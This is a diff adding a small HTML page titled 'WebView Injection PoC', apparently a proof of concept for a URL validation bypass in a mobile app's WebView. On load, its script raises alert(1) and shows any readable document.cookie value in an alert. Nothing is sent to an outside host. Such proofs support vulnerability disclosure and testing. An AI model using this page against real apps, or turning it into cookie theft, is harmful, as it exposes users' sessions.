@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Vulnerability PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px; background-color: #f3f2ef; }
+        .btn { background: #0073b1; color: white; border: none; padding: 15px 30px; border-radius: 25px; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1>WebView Injection PoC</h1>
+    <p>If you see alerts below, the URL validation bypass is successful.</p>
+    <button class="btn" onclick="runPoC()">Manually Trigger Alerts</button>
+
+    <script>
+        function runPoC() {
+            // Alert 1: Standard XSS Proof
+            alert(1);
+
+            // Alert 2: Document Cookies (If not HttpOnly, they will appear here)
+            if (document.cookie) {
+                alert("Captured Cookies:\n" + document.cookie);
+            } else {
+                alert("JavaScript Execution Confirmed.\n(Note: document.cookie is empty - likely protected by HttpOnly)");
+            }
+        }
+
+        // Auto-trigger on load for the "1-click" demonstration
+        window.onload = function() {
+            setTimeout(runPoC, 500);
+        };
+    </script>
+</body>
+</html>
